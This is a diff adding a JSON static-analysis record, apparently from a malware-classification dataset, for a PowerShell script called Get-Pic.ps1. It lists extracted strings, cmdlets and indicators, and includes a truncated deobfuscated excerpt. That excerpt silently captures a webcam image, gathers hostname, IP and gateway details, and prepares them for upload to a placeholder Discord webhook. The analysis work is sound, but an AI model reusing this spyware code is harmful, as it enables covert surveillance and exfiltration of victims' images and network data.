@@ -1,0 +1,144 @@
+{
+  "meta": {
+    "quelldatei": "tech_031_Get-Pic.ps1",
+    "sha256": "f953a69facadf83d2f23bb0720e99a721caec96348c195d3759f7530fa3e8222",
+    "groesse_bytes": 2381,
+    "zeilen": 50,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "snapshot.png",
+      "Integrated Camera",
+      "*Wi-Fi*",
+      "http://ipinfo.io/ip",
+      "0.0.0.0/0",
+      "*Ethernet*",
+      "Hostname: $hostname, WiFi Private IP: $wifiIPAddress, WiFi Public IP: $wifiPublicIPAddress, WiFi Default Gateway: $wifiGateway, Ethernet IP: $ethernetIPAddress, Ethernet Default Gateway: $ethernetGateway",
+      "multipart/form-data; boundary=$boundary",
+      "--$boundary`r`n",
+      "Content-Disposition: form-data; name=`",
+      "`r`n`r`n",
+      "{ `",
+      ": `",
+      " }`r`n",
+      "; filename=`",
+      "`r`n",
+      "Content-Type: application/octet-stream`r`n`r`n",
+      "`r`n--$boundary--",
+      "YOUR DISCORD WEBHOOK"
+    ],
+    "string_anzahl_gesamt": 22,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "snapshot.png",
+      "Integrated Camera",
+      "*Wi-Fi*",
+      "http://ipinfo.io/ip",
+      "0.0.0.0/0",
+      "*Ethernet*",
+      "Hostname: $hostname, WiFi Private IP: $wifiIPAddress, WiFi Public IP: $wifiPublicIPAddress, WiFi Default Gateway: $wifiGateway, Ethernet IP: $ethernetIPAddress, Ethernet Default Gateway: $ethernetGateway",
+      "multipart/form-data; boundary=$boundary",
+      "--$boundary`r`n",
+      "Content-Disposition: form-data; name=`",
+      "`r`n`r`n",
+      "{ `",
+      ": `",
+      " }`r`n",
+      "; filename=`",
+      "`r`n",
+      "Content-Type: application/octet-stream`r`n`r`n",
+      "`r`n--$boundary--",
+      "YOUR DISCORD WEBHOOK"
+    ],
+    "string_anzahl_gesamt": 22,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Clear-RecycleBin",
+      "Content-Disposition",
+      "Content-Type",
+      "Get-NetAdapter",
+      "Get-NetIPAddress",
+      "Get-NetRoute",
+      "Get-Pic",
+      "Invoke-RestMethod",
+      "Join-Path",
+      "Remove-Item",
+      "Where-Object",
+      "Wi-Fi"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [
+        "http://ipinfo.io/ip"
+      ],
+      "ipv4": [
+        "0.0.0.0"
+      ],
+      "pfade": [
+        "$env:COMPUTERNAME"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "snapshot.png",
+      "Integrated Camera",
+      "*Wi-Fi*",
+      "http://ipinfo.io/ip",
+      "0.0.0.0/0",
+      "*Ethernet*",
+      "Hostname: $hostname, WiFi Private IP: $wifiIPAddress, WiFi Public IP: $wifiPublicIPAddress, WiFi Default Gateway: $wifiGateway, Ethernet IP: $ethernetIPAddress, Ethernet Default Gateway: $ethernetGateway",
+      "multipart/form-data; boundary=$boundary",
+      "--$boundary`r`n",
+      "Content-Disposition: form-data; name=`",
+      "`r`n`r`n",
+      "{ `",
+      ": `",
+      " }`r`n",
+      "; filename=`",
+      "`r`n",
+      "Content-Type: application/octet-stream`r`n`r`n",
+      "`r`n--$boundary--",
+      "YOUR DISCORD WEBHOOK"
+    ],
+    "string_anzahl_gesamt": 22,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Clear-RecycleBin",
+      "Content-Disposition",
+      "Content-Type",
+      "Get-NetAdapter",
+      "Get-NetIPAddress",
+      "Get-NetRoute",
+      "Get-Pic",
+      "Invoke-RestMethod",
+      "Join-Path",
+      "Remove-Item",
+      "Where-Object",
+      "Wi-Fi"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [
+        "http://ipinfo.io/ip"
+      ],
+      "ipv4": [
+        "0.0.0.0"
+      ],
+      "pfade": [
+        "$env:COMPUTERNAME"
+      ]
+    },
+    "deobfuskiert_auszug": "function Get-Pic {\r\n    param(\r\n        [Parameter(Mandatory=$true)]\r\n        [string]$wh\r\n    )\r\n\r\n    $outputImage = Join-Path ([System.IO.Path]::GetTempPath()) \"snapshot.png\"\r\n    & ffmpeg -f dshow -i video=\"Integrated Camera\" -vframes 1 $outputImage\r\n\r\n    $hostname = $env:COMPUTERNAME\r\n\r\n    $wifiAdapter = Get-NetAdapter | Where-Object { $_.Name -like \"*Wi-Fi*\" }\r\n    $wifiIPAddress = ($wifiAdapter | Get-NetIPAddress -AddressFamily IPv4).IPAddress\r\n    $wifiPublicIPAddress = Invoke-RestMethod -Uri 'http://ipinfo.io/ip'\r\n    $wifiGateway = ($wifiAdapter | Get-NetRoute -DestinationPrefix '0.0.0.0/0').NextHop\r\n\r\n    $ethernetAdapter = Get-NetAdapter | Where-Object { $_.Name -like \"*Ethernet*\" }\r\n    $ethernetIPAddress = ($ethernetAdapter | Get-NetIPAddress -AddressFamily IPv4).IPAddress\r\n    $ethernetGateway = ($ethernetAdapter | Get-NetRoute -DestinationPrefix '0.0.0.0/0').NextHop\r\n\r\n    $infoMessage = \"Hostname: $hostname, WiFi Private IP: $wifiIPAddress, WiFi Public IP: $wifiPublicIPAddress, WiFi Default Gateway: $wifiGateway, Ethernet IP: $ethernetIPAddress, Ethernet Default Gateway: $ethernetGateway\"\r\n\r\n    $boundary = [System.Guid]::NewGuid().ToString()\r\n    $contentType = \"multipart/form-data; boundary=$boundary\"\r\n\r\n    $body = \"--$boundaryrn\" +\r\n            \"Content-Disposition: form-data; name=\"payload_json\"rnrn\" +\r\n            \"{ \"content\": \"$infoMessage\" }rn\" +\r\n            \"--$boundaryrn\" +\r\n            \"Content-Disposition: form-data; name=\"file\"; filename=\"$outputImage\"rn\" +\r\n            \"Content-Type: application/octet-streamrnrn\"\r\n\r\n    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)\r\n    $imageBytes = [System.IO.File]::ReadAllBytes($outputImage)\r\n    $endBytes = [System.Text.Encoding]::UTF8.GetBytes(\"rn--$boundary--\")\r\n\r\n    $bytes = [byte[]]::new($bodyBytes.Length + $imageBytes.Length + $endBytes.Length)\r\n    [System.Array]::Copy($bodyBytes, 0, $bytes, 0, $bodyBytes.Length)\r\n    [System.Array]::Copy($imageBytes, 0, $bytes, $bodyBytes.Le",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": []
+  }
+}
